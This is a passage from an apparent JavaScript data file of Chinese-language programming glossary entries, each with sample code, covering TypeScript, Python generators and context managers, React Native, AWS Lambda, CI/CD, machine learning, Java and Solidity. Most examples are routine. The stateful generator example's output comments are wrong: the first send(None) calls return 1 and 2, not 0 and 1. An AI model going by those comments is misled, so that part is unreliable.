  updateUser(id: number, updates: Partial<User>): Promise<User>;
  deleteUser(id: number): Promise<void>;
}

// 实现接口
class DatabaseUserService implements UserService {
  async getUser(id: number): Promise<User> {
    // 数据库查询逻辑
    const userData = await db.users.findById(id);
    return userData;
  }

  async createUser(userData: Omit<User, 'id' | 'createdAt'>): Promise<User> {
    const newUser = {
      ...userData,
      id: generateId(),
      createdAt: new Date()
    };
    await db.users.insert(newUser);
    return newUser;
  }

  async updateUser(id: number, updates: Partial<User>): Promise<User> {
    await db.users.update(id, updates);
    return this.getUser(id);
  }

  async deleteUser(id: number): Promise<void> {
    await db.users.delete(id);
  }
}

// 接口继承
interface Animal {
  name: string;
  age: number;
}

interface Dog extends Animal {
  breed: string;
  bark(): void;
}

interface Cat extends Animal {
  color: string;
  meow(): void;
}

// 多重继承
interface Pet extends Animal {
  owner: string;
}

interface ServiceDog extends Dog, Pet {
  serviceType: string;
  isWorking: boolean;
}

// 索引签名
interface StringDictionary {
  [key: string]: string;
}

interface NumberDictionary {
  [key: string]: number;
  length: number; // 可以有具体的属性
}

// 泛型接口
interface Repository<T> {
  findById(id: number): Promise<T | null>;
  findAll(): Promise<T[]>;
  create(entity: Omit<T, 'id'>): Promise<T>;
  update(id: number, updates: Partial<T>): Promise<T>;
  delete(id: number): Promise<void>;
}

interface Product {
  id: number;
  name: string;
  price: number;
  category: string;
}

class ProductRepository implements Repository<Product> {
  async findById(id: number): Promise<Product | null> {
    return await db.products.findById(id);
  }

  async findAll(): Promise<Product[]> {
    return await db.products.findAll();
  }

  async create(productData: Omit<Product, 'id'>): Promise<Product> {
    const product = { ...productData, id: generateId() };
    await db.products.insert(product);
    return product;
  }

  async update(id: number, updates: Partial<Product>): Promise<Product> {
    await db.products.update(id, updates);
    return this.findById(id)!;
  }

  async delete(id: number): Promise<void> {
    await db.products.delete(id);
  }
}

// 条件类型接口
interface ApiResponse<T> {
  success: boolean;
  data: T;
  error?: string;
}

interface PaginatedResponse<T> extends ApiResponse<T[]> {
  pagination: {
    page: number;
    limit: number;
    total: number;
  };
}

// 使用示例
const userResponse: ApiResponse<User> = {
  success: true,
  data: user
};

const usersResponse: PaginatedResponse<User> = {
  success: true,
  data: [user],
  pagination: {
    page: 1,
    limit: 10,
    total: 100
  }
};`,
      useCases: ['契约定义', '类型约束', '代码组织', 'API设计'],
      relatedTerms: ['contracts', 'type definitions', 'inheritance', 'polymorphism']
    }
  ],

  // 性能优化 (25个术语)
  performance: [
    {
      id: 'perf_1',
      name: 'lazy_loading',
      chinese: '懒加载',
      description: '延迟加载资源直到真正需要时才加载，提高初始页面加载性能',
      difficulty: 'intermediate',
      tags: ['performance', 'optimization', 'loading'],
      example: `// 图片懒加载
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      observer.unobserve(img);
    }
  });
});

// 观察所有懒加载图片
document.querySelectorAll('img[data-src]').forEach(img => {
  observer.observe(img);
});

// React组件懒加载
import { lazy, Suspense } from 'react';

const LazyComponent = lazy(() => import('./Component'));

function App() {
  return (
    <Suspense fallback="Loading...">
      <LazyComponent />
    </Suspense>
  );
}`,
      useCases: ['页面性能', '资源优化', '用户体验', '带宽节省'],
      relatedTerms: ['code splitting', 'intersection observer', 'dynamic imports', 'virtual scrolling']
    }
  ],

  // Python编程 (40个术语)
  python: [
    {
      id: 'py_1',
      name: 'list_comprehension',
      chinese: '列表推导式',
      description: 'Python中创建列表的简洁语法，可以在一行代码中完成过滤和转换操作',
      difficulty: 'intermediate',
      tags: ['syntax', 'functional', 'lists'],
      example: `# 基本列表推导式
numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

# 创建平方数列表
squares = [x**2 for x in numbers]
print(squares)  # [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]

# 过滤偶数并求平方
even_squares = [x**2 for x in numbers if x % 2 == 0]
print(even_squares)  # [4, 16, 36, 64, 100]

# 嵌套列表推导式
matrix = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
flattened = [num for row in matrix for num in row]
print(flattened)  # [1, 2, 3, 4, 5, 6, 7, 8, 9]

# 条件表达式
result = [x if x > 0 else 0 for x in [-2, -1, 0, 1, 2]]
print(result)  # [0, 0, 0, 1, 2]

# 字典推导式
words = ['hello', 'world', 'python', 'programming']
word_lengths = {word: len(word) for word in words}
print(word_lengths)  # {'hello': 5, 'world': 5, 'python': 6, 'programming': 11}

# 集合推导式
unique_lengths = {len(word) for word in words}
print(unique_lengths)  # {5, 6, 11}

# 生成器表达式
squares_gen = (x**2 for x in numbers)
print(list(squares_gen))  # [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]

# 复杂示例：处理文件数据
def process_log_file(filename):
    with open(filename, 'r') as file:
        # 提取所有ERROR级别的日志行，并获取时间戳
        error_timestamps = [
            line.split()[0]
            for line in file
            if 'ERROR' in line and line.strip()
        ]
    return error_timestamps

# 实际应用：数据处理
students = [
    {'name': 'Alice', 'grades': [85, 90, 78]},
    {'name': 'Bob', 'grades': [92, 88, 84]},
    {'name': 'Charlie', 'grades': [76, 81, 79]}
]

# 计算每个学生的平均分
averages = [
    {
        'name': student['name'],
        'average': sum(student['grades']) / len(student['grades'])
    }
    for student in students
]

# 找出平均分大于80的学生
high_performers = [
    student['name']
    for student in students
    if sum(student['grades']) / len(student['grades']) > 80
]`,
      useCases: ['数据处理', '函数式编程', '代码简化', '性能优化'],
      relatedTerms: ['generator expressions', 'functional programming', 'iterators', 'lambda functions']
    },
    {
      id: 'py_2',
      name: 'decorators',
      chinese: '装饰器',
      description: 'Python中修改或扩展函数行为的语法糖，实现横切关注点的分离',
      difficulty: 'advanced',
      tags: ['decorators', 'metaprogramming', 'functions'],
      example: `import functools
import time

# 基本装饰器
def timer(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        end = time.time()
        print(f"{func.__name__} took {end - start:.4f}s")
        return result
    return wrapper

@timer
def slow_function():
    time.sleep(1)
    return "Done"

# 带参数的装饰器
def retry(max_attempts=3):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise e
                    print(f"Attempt {attempt + 1} failed")
        return wrapper
    return decorator

@retry(max_attempts=3)
def unreliable_function():
    import random
    if random.random() < 0.7:
        raise Exception("Random failure")
    return "Success"

# 属性装饰器
class Circle:
    def __init__(self, radius):
        self._radius = radius

    @property
    def radius(self):
        return self._radius

    @radius.setter
    def radius(self, value):
        if value < 0:
            raise ValueError("Radius cannot be negative")
        self._radius = value

    @property
    def area(self):
        return 3.14159 * self._radius ** 2`,
      useCases: ['横切关注点', '代码复用', '功能增强', '元编程'],
      relatedTerms: ['metaprogramming', 'aspect-oriented programming', 'higher-order functions', 'closures']
    },
    {
      id: 'py_3',
      name: 'generator',
      chinese: '生成器',
      description: 'Python中可以暂停和恢复执行的特殊函数，用于创建迭代器',
      difficulty: 'intermediate',
      tags: ['python', 'iterator', 'memory-efficient'],
      example: `# 基本生成器函数
def count_up_to(max_count):
    count = 1
    while count <= max_count:
        yield count
        count += 1

# 使用生成器
counter = count_up_to(3)
for num in counter:
    print(num)  # 输出: 1, 2, 3

# 手动调用next()
counter = count_up_to(3)
print(next(counter))  # 1
print(next(counter))  # 2
print(next(counter))  # 3

# 斐波那契数列生成器
def fibonacci():
    a, b = 0, 1
    while True:
        yield a
        a, b = b, a + b

# 获取前10个斐波那契数
fib = fibonacci()
fib_numbers = [next(fib) for _ in range(10)]
print(fib_numbers)  # [0, 1, 1, 2, 3, 5, 8, 13, 21, 34]

# 生成器表达式
squares = (x**2 for x in range(10))
print(list(squares))  # [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]

# 文件处理生成器
def read_large_file(file_path):
    """逐行读取大文件，节省内存"""
    with open(file_path, 'r') as file:
        for line in file:
            yield line.strip()

# 数据处理管道
def process_numbers(numbers):
    """处理数字序列"""
    for num in numbers:
        if num % 2 == 0:  # 只处理偶数
            yield num * 2

def filter_large(numbers, threshold=10):
    """过滤大于阈值的数字"""
    for num in numbers:
        if num > threshold:
            yield num

# 组合生成器
numbers = range(1, 11)
processed = process_numbers(numbers)
filtered = filter_large(processed, 5)
result = list(filtered)
print(result)  # [8, 12, 16, 20]

# 生成器的状态保持
def stateful_generator():
    state = 0
    while True:
        received = yield state
        if received is not None:
            state = received
        else:
            state += 1

gen = stateful_generator()
next(gen)  # 启动生成器
print(gen.send(None))  # 0
print(gen.send(None))  # 1
print(gen.send(10))    # 10
print(gen.send(None))  # 11

# 协程式生成器
def consumer():
    """消费者协程"""
    while True:
        item = yield
        print(f"处理项目: {item}")

def producer(consumer_gen):
    """生产者函数"""
    next(consumer_gen)  # 启动协程
    for i in range(5):
        consumer_gen.send(f"item_{i}")

# 使用协程
c = consumer()
producer(c)`,
      useCases: ['内存优化', '大数据处理', '流式计算', '协程编程'],
      relatedTerms: ['iterator', 'yield', 'coroutine', 'lazy evaluation']
    },
    {
      id: 'py_4',
      name: 'context_manager',
      chinese: '上下文管理器',
      description: 'Python中用于资源管理的协议，确保资源的正确获取和释放',
      difficulty: 'intermediate',
      tags: ['python', 'resource-management', 'with-statement'],
      example: `# 使用with语句
with open('file.txt', 'r') as file:
    content = file.read()
    print(content)
# 文件自动关闭，即使发生异常

# 自定义上下文管理器类
class DatabaseConnection:
    def __init__(self, db_name):
        self.db_name = db_name
        self.connection = None

    def __enter__(self):
        print(f"连接到数据库: {self.db_name}")
        self.connection = f"connection_to_{self.db_name}"
        return self.connection

    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f"关闭数据库连接: {self.db_name}")
        if exc_type:
            print(f"发生异常: {exc_type.__name__}: {exc_val}")
        self.connection = None
        return False  # 不抑制异常

# 使用自定义上下文管理器
with DatabaseConnection("mydb") as conn:
    print(f"使用连接: {conn}")
    # 执行数据库操作

# 使用contextlib装饰器
from contextlib import contextmanager

@contextmanager
def timer():
    import time
    start = time.time()
    print("开始计时")
    try:
        yield
    finally:
        end = time.time()
        print(f"耗时: {end - start:.2f}秒")

# 使用计时器
with timer():
    import time
    time.sleep(1)
    print("执行一些操作")

# 文件操作上下文管理器
@contextmanager
def file_manager(filename, mode):
    print(f"打开文件: {filename}")
    file = open(filename, mode)
    try:
        yield file
    finally:
        print(f"关闭文件: {filename}")
        file.close()

# 使用文件管理器
with file_manager('test.txt', 'w') as f:
    f.write('Hello, World!')

# 多个上下文管理器
with open('input.txt', 'r') as infile, \\
     open('output.txt', 'w') as outfile:
    data = infile.read()
    outfile.write(data.upper())

# 异常处理上下文管理器
@contextmanager
def error_handler():
    try:
        yield
    except ValueError as e:
        print(f"捕获到ValueError: {e}")
    except Exception as e:
        print(f"捕获到其他异常: {e}")
        raise

with error_handler():
    # 这里的异常会被处理
    raise ValueError("这是一个值错误")

# 临时目录上下文管理器
import tempfile
import os

@contextmanager
def temporary_directory():
    temp_dir = tempfile.mkdtemp()
    try:
        yield temp_dir
    finally:
        import shutil
        shutil.rmtree(temp_dir)

with temporary_directory() as temp_dir:
    print(f"临时目录: {temp_dir}")
    # 在临时目录中工作
    temp_file = os.path.join(temp_dir, 'temp.txt')
    with open(temp_file, 'w') as f:
        f.write('临时文件内容')
# 临时目录自动删除

# 锁上下文管理器
import threading

class ThreadLock:
    def __init__(self):
        self.lock = threading.Lock()

    def __enter__(self):
        self.lock.acquire()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.lock.release()

# 使用线程锁
shared_resource = []
lock = ThreadLock()

def worker():
    with lock:
        # 线程安全的操作
        shared_resource.append(threading.current_thread().name)

# 创建多个线程
threads = []
for i in range(5):
    t = threading.Thread(target=worker)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print(shared_resource)`,
      useCases: ['资源管理', '异常安全', '自动清理', '线程同步'],
      relatedTerms: ['with statement', 'resource management', 'RAII', 'exception safety']
    }
  ],

  // 移动开发 (30个术语)
  mobile: [
    {
      id: 'mobile_1',
      name: 'react_native',
      chinese: 'React Native',
      description: '使用React开发原生移动应用的框架，支持iOS和Android平台',
      difficulty: 'intermediate',
      tags: ['mobile', 'cross-platform', 'react'],
      example: `// React Native 基础组件
import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  FlatList,
  Alert,
  Platform,
  Dimensions
} from 'react-native';

// 基础组件示例
const UserProfile = ({ user }) => {
  const [isLoading, setIsLoading] = useState(false);

  const handleUpdateProfile = async () => {
    setIsLoading(true);
    try {
      await updateUserProfile(user.id, updatedData);
      Alert.alert('Success', 'Profile updated successfully');
    } catch (error) {
      Alert.alert('Error', 'Failed to update profile');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>{user.name}</Text>
      <Text style={styles.subtitle}>{user.email}</Text>

      <TouchableOpacity
        style={[styles.button, isLoading && styles.buttonDisabled]}
        onPress={handleUpdateProfile}
        disabled={isLoading}
      >
        <Text style={styles.buttonText}>
          {isLoading ? 'Updating...' : 'Update Profile'}
        </Text>
      </TouchableOpacity>
    </View>
  );
};

// 列表组件
const UserList = ({ users }) => {
  const renderUser = ({ item }) => (
    <TouchableOpacity style={styles.userItem}>
      <Text style={styles.userName}>{item.name}</Text>
      <Text style={styles.userEmail}>{item.email}</Text>
    </TouchableOpacity>
  );

  return (
    <FlatList
      data={users}
      renderItem={renderUser}
      keyExtractor={item => item.id.toString()}
      showsVerticalScrollIndicator={false}
      contentContainerStyle={styles.listContainer}
    />
  );
};

// 响应式样式
const { width, height } = Dimensions.get('window');

const styles = StyleSheet.create({
  container: {
    flex: 1,
    padding: 20,
    backgroundColor: '#f5f5f5',
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 8,
  },
  subtitle: {
    fontSize: 16,
    color: '#666',
    marginBottom: 20,
  },
  button: {
    backgroundColor: '#007AFF',
    paddingVertical: 12,
    paddingHorizontal: 24,
    borderRadius: 8,
    alignItems: 'center',
  },
  buttonDisabled: {
    backgroundColor: '#ccc',
  },
  buttonText: {
    color: 'white',
    fontSize: 16,
    fontWeight: '600',
  },
  userItem: {
    backgroundColor: 'white',
    padding: 16,
    marginVertical: 4,
    borderRadius: 8,
    shadowColor: '#000',
    shadowOffset: {
      width: 0,
      height: 1,
    },
    shadowOpacity: 0.22,
    shadowRadius: 2.22,
    elevation: 3,
  },
  userName: {
    fontSize: 18,
    fontWeight: '600',
    color: '#333',
  },
  userEmail: {
    fontSize: 14,
    color: '#666',
    marginTop: 4,
  },
  listContainer: {
    paddingVertical: 8,
  },
});

// 平台特定代码
const PlatformSpecificComponent = () => {
  return (
    <View style={styles.container}>
      <Text style={styles.title}>
        {Platform.OS === 'ios' ? 'iOS App' : 'Android App'}
      </Text>

      {Platform.select({
        ios: <Text>This is iOS specific content</Text>,
        android: <Text>This is Android specific content</Text>,
      })}
    </View>
  );
};

// 导航配置
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';

const Stack = createStackNavigator();
const Tab = createBottomTabNavigator();

function HomeStack() {
  return (
    <Stack.Navigator>
      <Stack.Screen
        name="Home"
        component={HomeScreen}
        options={{ title: 'Welcome' }}
      />
      <Stack.Screen
        name="Profile"
        component={ProfileScreen}
        options={{ title: 'User Profile' }}
      />
    </Stack.Navigator>
  );
}

function App() {
  return (
    <NavigationContainer>
      <Tab.Navigator>
        <Tab.Screen
          name="HomeTab"
          component={HomeStack}
          options={{
            tabBarLabel: 'Home',
            tabBarIcon: ({ color, size }) => (
              <Icon name="home" color={color} size={size} />
            ),
          }}
        />
        <Tab.Screen
          name="Settings"
          component={SettingsScreen}
          options={{
            tabBarLabel: 'Settings',
            tabBarIcon: ({ color, size }) => (
              <Icon name="settings" color={color} size={size} />
            ),
          }}
        />
      </Tab.Navigator>
    </NavigationContainer>
  );
}

// 原生模块集成
import { NativeModules, NativeEventEmitter } from 'react-native';

const { CustomNativeModule } = NativeModules;

// 调用原生方法
const callNativeMethod = async () => {
  try {
    const result = await CustomNativeModule.performNativeOperation();
    console.log('Native result:', result);
  } catch (error) {
    console.error('Native method failed:', error);
  }
};

// 监听原生事件
const eventEmitter = new NativeEventEmitter(CustomNativeModule);
const subscription = eventEmitter.addListener('CustomEvent', (event) => {
  console.log('Received native event:', event);
});

// 清理订阅
useEffect(() => {
  return () => {
    subscription.remove();
  };
}, []);`,
      useCases: ['跨平台开发', '原生性能', '代码复用', '快速开发'],
      relatedTerms: ['cross-platform', 'native modules', 'bridge', 'metro bundler']
    }
  ],

  // 云计算 (35个术语)
  cloud: [
    {
      id: 'cloud_1',
      name: 'aws_lambda',
      chinese: 'AWS Lambda',
      description: 'Amazon的无服务器计算服务，按需执行代码而无需管理服务器',
      difficulty: 'intermediate',
      tags: ['serverless', 'aws', 'functions'],
      example: `// AWS Lambda 函数示例
const AWS = require('aws-sdk');
const dynamodb = new AWS.DynamoDB.DocumentClient();

// 基本Lambda函数
exports.handler = async (event, context) => {
  console.log('Event:', JSON.stringify(event, null, 2));
  console.log('Context:', JSON.stringify(context, null, 2));

  try {
    const result = await processEvent(event);

    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({
        success: true,
        data: result
      })
    };
  } catch (error) {
    console.error('Error:', error);

    return {
      statusCode: 500,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({
        success: false,
        error: error.message
      })
    };
  }
};

// API Gateway集成
exports.apiHandler = async (event, context) => {
  const { httpMethod, path, pathParameters, queryStringParameters, body } = event;

  switch (httpMethod) {
    case 'GET':
      if (pathParameters && pathParameters.id) {
        return await getItem(pathParameters.id);
      } else {
        return await getItems(queryStringParameters);
      }

    case 'POST':
      return await createItem(JSON.parse(body));

    case 'PUT':
      return await updateItem(pathParameters.id, JSON.parse(body));

    case 'DELETE':
      return await deleteItem(pathParameters.id);

    default:
      return {
        statusCode: 405,
        body: JSON.stringify({ error: 'Method not allowed' })
      };
  }
};

// DynamoDB操作
async function getItem(id) {
  const params = {
    TableName: process.env.TABLE_NAME,
    Key: { id }
  };

  const result = await dynamodb.get(params).promise();

  return {
    statusCode: result.Item ? 200 : 404,
    body: JSON.stringify(result.Item || { error: 'Item not found' })
  };
}

async function createItem(item) {
  const params = {
    TableName: process.env.TABLE_NAME,
    Item: {
      ...item,
      id: generateId(),
      createdAt: new Date().toISOString()
    }
  };

  await dynamodb.put(params).promise();

  return {
    statusCode: 201,
    body: JSON.stringify(params.Item)
  };
}

// S3事件处理
exports.s3Handler = async (event, context) => {
  const s3 = new AWS.S3();

  for (const record of event.Records) {
    const bucket = record.s3.bucket.name;
    const key = record.s3.object.key;

    console.log(\`Processing file: \${key} from bucket: \${bucket}\`);

    try {
      // 获取文件
      const object = await s3.getObject({ Bucket: bucket, Key: key }).promise();

      // 处理文件内容
      if (key.endsWith('.json')) {
        const data = JSON.parse(object.Body.toString());
        await processJsonData(data);
      } else if (key.endsWith('.csv')) {
        const csvData = object.Body.toString();
        await processCsvData(csvData);
      }

      // 移动到处理完成的文件夹
      await s3.copyObject({
        Bucket: bucket,
        CopySource: \`\${bucket}/\${key}\`,
        Key: \`processed/\${key}\`
      }).promise();

      await s3.deleteObject({ Bucket: bucket, Key: key }).promise();

    } catch (error) {
      console.error(\`Error processing \${key}:\`, error);

      // 移动到错误文件夹
      await s3.copyObject({
        Bucket: bucket,
        CopySource: \`\${bucket}/\${key}\`,
        Key: \`errors/\${key}\`
      }).promise();
    }
  }
};

// CloudWatch定时任务
exports.scheduledHandler = async (event, context) => {
  console.log('Running scheduled task:', event);

  try {
    // 清理过期数据
    await cleanupExpiredData();

    // 生成报告
    await generateDailyReport();

    // 发送通知
    await sendNotification('Daily tasks completed successfully');

  } catch (error) {
    console.error('Scheduled task failed:', error);
    await sendNotification(\`Daily tasks failed: \${error.message}\`);
  }
};

// SQS消息处理
exports.sqsHandler = async (event, context) => {
  const sqs = new AWS.SQS();

  for (const record of event.Records) {
    const messageBody = JSON.parse(record.body);

    try {
      await processMessage(messageBody);

      // 删除消息
      await sqs.deleteMessage({
        QueueUrl: process.env.QUEUE_URL,
        ReceiptHandle: record.receiptHandle
      }).promise();

    } catch (error) {
      console.error('Message processing failed:', error);

      // 发送到死信队列
      await sqs.sendMessage({
        QueueUrl: process.env.DLQ_URL,
        MessageBody: JSON.stringify({
          originalMessage: messageBody,
          error: error.message,
          timestamp: new Date().toISOString()
        })
      }).promise();
    }
  }
};

// 环境变量和配置
const config = {
  tableName: process.env.TABLE_NAME,
  bucketName: process.env.BUCKET_NAME,
  queueUrl: process.env.QUEUE_URL,
  region: process.env.AWS_REGION || 'us-east-1'
};

// 错误处理和重试
async function withRetry(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) throw error;

      const delay = Math.pow(2, i) * 1000; // 指数退避
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

// 使用示例
async function processEvent(event) {
  return await withRetry(async () => {
    // 处理逻辑
    const result = await someAsyncOperation(event);
    return result;
  });
}`,
      useCases: ['事件处理', '微服务', 'API后端', '数据处理'],
      relatedTerms: ['serverless', 'event-driven', 'microservices', 'auto-scaling']
    }
  ],

  // DevOps与部署 (30个术语)
  devops: [
    {
      id: 'devops_1',
      name: 'ci_cd',
      chinese: '持续集成/持续部署',
      description: '自动化软件开发流程，包括代码集成、测试和部署的实践',
      difficulty: 'intermediate',
      tags: ['automation', 'deployment', 'pipeline'],
      example: `# GitHub Actions CI/CD 配置
name: CI/CD Pipeline

on:
  push:
    branches: [ main, develop ]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'

    - name: Install and test
      run: |
        npm ci
        npm run lint
        npm run test:unit
        npm run build

  deploy:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
    - name: Deploy to production
      run: |
        kubectl set image deployment/myapp \\
          myapp=myregistry/myapp:latest
        kubectl rollout status deployment/myapp

# Jenkins Pipeline 示例
pipeline {
    agent any
    stages {
        stage('Test') {
            steps {
                sh 'npm ci'
                sh 'npm run test'
            }
        }
        stage('Build') {
            steps {
                sh 'docker build -t myapp .'
                sh 'docker push myapp'
            }
        }
        stage('Deploy') {
            steps {
                sh 'kubectl apply -f k8s/'
            }
        }
    }
}`,
      useCases: ['自动化部署', '质量保证', '快速交付', '风险降低'],
      relatedTerms: ['automation', 'pipeline', 'deployment', 'testing']
    }
  ],

  // 数据科学 (25个术语)
  datascience: [
    {
      id: 'ds_1',
      name: 'machine_learning',
      chinese: '机器学习',
      description: '让计算机通过数据学习模式和做出预测的人工智能分支',
      difficulty: 'advanced',
      tags: ['ai', 'ml', 'algorithms'],
      example: `# Python机器学习示例
import numpy as np
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score

# 分类任务示例
def classification_example():
    # 加载数据
    from sklearn.datasets import load_iris
    iris = load_iris()
    X, y = iris.data, iris.target

    # 分割数据
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42
    )

    # 特征缩放
    scaler = StandardScaler()
    X_train_scaled = scaler.fit_transform(X_train)
    X_test_scaled = scaler.transform(X_test)

    # 训练模型
    model = RandomForestClassifier(n_estimators=100, random_state=42)
    model.fit(X_train_scaled, y_train)

    # 预测和评估
    y_pred = model.predict(X_test_scaled)
    accuracy = accuracy_score(y_test, y_pred)
    print(f"Accuracy: {accuracy:.4f}")

    return model, scaler

# 深度学习示例
def deep_learning_example():
    import tensorflow as tf
    from tensorflow.keras.models import Sequential
    from tensorflow.keras.layers import Dense, Dropout

    # 构建模型
    model = Sequential([
        Dense(512, activation='relu', input_shape=(784,)),
        Dropout(0.2),
        Dense(10, activation='softmax')
    ])

    # 编译模型
    model.compile(
        optimizer='adam',
        loss='categorical_crossentropy',
        metrics=['accuracy']
    )

    return model

# 模型部署API
from flask import Flask, request, jsonify
import joblib

app = Flask(__name__)
model = joblib.load('model.pkl')

@app.route('/predict', methods=['POST'])
def predict():
    data = request.json
    features = np.array(data['features']).reshape(1, -1)
    prediction = model.predict(features)
    return jsonify({'prediction': int(prediction[0])})`,
      useCases: ['预测分析', '模式识别', '自动化决策', '数据挖掘'],
      relatedTerms: ['supervised learning', 'unsupervised learning', 'neural networks', 'feature engineering']
    },
    {
      id: 'ds_2',
      name: 'data_visualization',
      chinese: '数据可视化',
      description: '将数据转换为图形和图表的技术，帮助理解数据模式和趋势',
      difficulty: 'intermediate',
      tags: ['visualization', 'charts', 'analysis'],
      example: `import matplotlib.pyplot as plt
import seaborn as sns
import pandas as pd
import numpy as np

# 基本图表
data = {'A': [1, 2, 3, 4], 'B': [2, 4, 6, 8]}
df = pd.DataFrame(data)

# 线图
plt.figure(figsize=(10, 6))
plt.plot(df['A'], df['B'], marker='o')
plt.title('Line Plot')
plt.xlabel('A')
plt.ylabel('B')
plt.show()

# 热力图
correlation_matrix = df.corr()
sns.heatmap(correlation_matrix, annot=True, cmap='coolwarm')
plt.title('Correlation Heatmap')
plt.show()

# 分布图
sns.histplot(data=df, x='A', kde=True)
plt.title('Distribution Plot')
plt.show()`,
      useCases: ['数据分析', '报告生成', '模式发现', '决策支持'],
      relatedTerms: ['matplotlib', 'seaborn', 'plotly', 'dashboard']
    }
  ],

  // Java编程 (20个术语)
  java: [
    {
      id: 'java_1',
      name: 'oop_principles',
      chinese: '面向对象编程原则',
      description: 'Java的核心编程范式，包括封装、继承、多态和抽象四大原则',
      difficulty: 'intermediate',
      tags: ['oop', 'principles', 'design'],
      example: `// 封装 (Encapsulation)
public class BankAccount {
    private double balance;
    private String accountNumber;

    public BankAccount(String accountNumber, double initialBalance) {
        this.accountNumber = accountNumber;
        this.balance = initialBalance;
    }

    public double getBalance() {
        return balance;
    }

    public void deposit(double amount) {
        if (amount > 0) {
            balance += amount;
        }
    }

    public boolean withdraw(double amount) {
        if (amount > 0 && amount <= balance) {
            balance -= amount;
            return true;
        }
        return false;
    }
}

// 继承 (Inheritance)
public class SavingsAccount extends BankAccount {
    private double interestRate;

    public SavingsAccount(String accountNumber, double initialBalance, double interestRate) {
        super(accountNumber, initialBalance);
        this.interestRate = interestRate;
    }

    public void addInterest() {
        double interest = getBalance() * interestRate / 100;
        deposit(interest);
    }
}

// 多态 (Polymorphism)
public abstract class Animal {
    public abstract void makeSound();

    public void sleep() {
        System.out.println("The animal is sleeping");
    }
}

public class Dog extends Animal {
    @Override
    public void makeSound() {
        System.out.println("Woof!");
    }
}

public class Cat extends Animal {
    @Override
    public void makeSound() {
        System.out.println("Meow!");
    }
}

// 使用多态
Animal[] animals = {new Dog(), new Cat()};
for (Animal animal : animals) {
    animal.makeSound(); // 运行时决定调用哪个方法
}`,
      useCases: ['代码组织', '可维护性', '代码复用', '系统设计'],
      relatedTerms: ['inheritance', 'polymorphism', 'encapsulation', 'abstraction']
    },
    {
      id: 'java_2',
      name: 'collections_framework',
      chinese: 'Java集合框架',
      description: 'Java提供的数据结构和算法的统一架构，包括List、Set、Map等接口',
      difficulty: 'intermediate',
      tags: ['collections', 'data-structures', 'framework'],
      example: `import java.util.*;

// List - 有序集合，允许重复
List<String> arrayList = new ArrayList<>();
arrayList.add("Apple");
arrayList.add("Banana");
arrayList.add("Apple"); // 允许重复

List<String> linkedList = new LinkedList<>();
linkedList.addAll(arrayList);

// Set - 无序集合，不允许重复
Set<String> hashSet = new HashSet<>();
hashSet.add("Apple");
hashSet.add("Banana");
hashSet.add("Apple"); // 重复元素会被忽略
System.out.println(hashSet.size()); // 2

Set<String> treeSet = new TreeSet<>(); // 自动排序
treeSet.addAll(hashSet);

// Map - 键值对集合
Map<String, Integer> hashMap = new HashMap<>();
hashMap.put("Apple", 5);
hashMap.put("Banana", 3);
hashMap.put("Orange", 8);

// 遍历Map
for (Map.Entry<String, Integer> entry : hashMap.entrySet()) {
    System.out.println(entry.getKey() + ": " + entry.getValue());
}

// 使用Stream API处理集合
List<Integer> numbers = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);

List<Integer> evenSquares = numbers.stream()
    .filter(n -> n % 2 == 0)
    .map(n -> n * n)
    .collect(Collectors.toList());

System.out.println(evenSquares); // [4, 16, 36, 64, 100]`,
      useCases: ['数据存储', '算法实现', '性能优化', 'API设计'],
      relatedTerms: ['generics', 'iterators', 'stream api', 'lambda expressions']
    }
  ],

  // 区块链 (15个术语)
  blockchain: [
    {
      id: 'blockchain_1',
      name: 'smart_contracts',
      chinese: '智能合约',
      description: '在区块链上自动执行的合约，代码即法律，无需第三方介入',
      difficulty: 'advanced',
      tags: ['blockchain', 'ethereum', 'solidity'],
      example: `// Solidity智能合约示例
pragma solidity ^0.8.0;

contract SimpleToken {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    uint256 public totalSupply;
    string public name;
    string public symbol;
    uint8 public decimals;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(
        string memory _name,
        string memory _symbol,
        uint256 _totalSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = 18;
        totalSupply = _totalSupply * 10**decimals;
        balances[msg.sender] = totalSupply;
    }
